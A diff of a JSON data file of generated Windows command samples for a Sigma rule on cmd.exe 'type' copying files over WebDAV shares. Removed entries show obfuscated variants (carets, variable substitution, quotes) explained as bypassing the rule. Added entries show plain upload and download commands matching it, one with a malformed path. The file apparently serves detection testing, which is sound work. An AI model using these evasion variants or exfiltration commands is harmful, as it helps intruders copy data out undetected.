@@ -1,22 +1,18 @@
 [
   {
-    "output": "cmd.exe /c t^y^p^e C:\\temp\\data.txt > \\\\webdav.server.local\\share\\data.txt",
-    "explanation": "This command uses insertion (carets to escape characters) and reordering (standard syntax) to bypass the Sigma rule while maintaining the same behavior as the original command."
+    "output": "C:\\Windows\\System32\\cmd.exe /C type \\example.com\\file.txt > C:\\output.txt",
+    "explanation": "This command simulates a benign use of the 'type' command to download a file from a WebDAV server, matching the Sigma rule's detection criteria. It includes the required syntax elements ('type' followed by a UNC path and redirection to a local file)."
   },
   {
-    "output": "cmd.exe /c set \"cmd=type\" && call %cmd% \\\\webdav.server.local\\share\\file.txt > C:\\temp\\file.txt",
-    "explanation": "This command uses environment variable substitution and call syntax to obfuscate the use of the 'type' command, making it harder for the Sigma rule to detect."
+    "output": "C:\\Windows\\System32\\cmd.exe /C type C:\\input.txt > \\\\example.com\\upload.txt",
+    "explanation": "This command simulates a benign use of the 'type' command to upload a file to a WebDAV server, matching the Sigma rule's detection criteria. It includes the required syntax elements ('type' of a local file and redirection to a UNC path)."
   },
   {
-    "output": "cmd.exe /c type C:\\temp\\data.txt >\\\\webdav.server.local\\share\\data.txt",
-    "explanation": "This command uses omission (removing spaces) and reordering to bypass the Sigma rule's atom-based detection while preserving the original behavior."
+    "output": "C:\\Windows\\System32\\cmd.exe /C type \\\\example.com\\file.txt > C:\\output.txt",
+    "explanation": "This command is a direct match for the Sigma rule's 'selection_download' condition. It uses the 'type' command to download a file from a WebDAV server and save it locally."
   },
   {
-    "output": "cmd.exe /c t^yp^e payload.exe > payload.exe",
-    "explanation": "This command uses insertion (carets to escape characters) and reordering to bypass the Sigma rule while maintaining the same behavior as the original command."
-  },
-  {
-    "output": "cmd.exe /c type \"payload.exe\" > payload.exe",
-    "explanation": "This command uses insertion (quotes) and reordering to bypass the Sigma rule while maintaining the same behavior as the original command."
+    "output": "C:\\Windows\\System32\\cmd.exe /C type C:\\input.txt > \\\\example.com\\upload.txt",
+    "explanation": "This command is a direct match for the Sigma rule's 'selection_upload' condition. It uses the 'type' command to upload a file to a WebDAV server."
   }
 ]
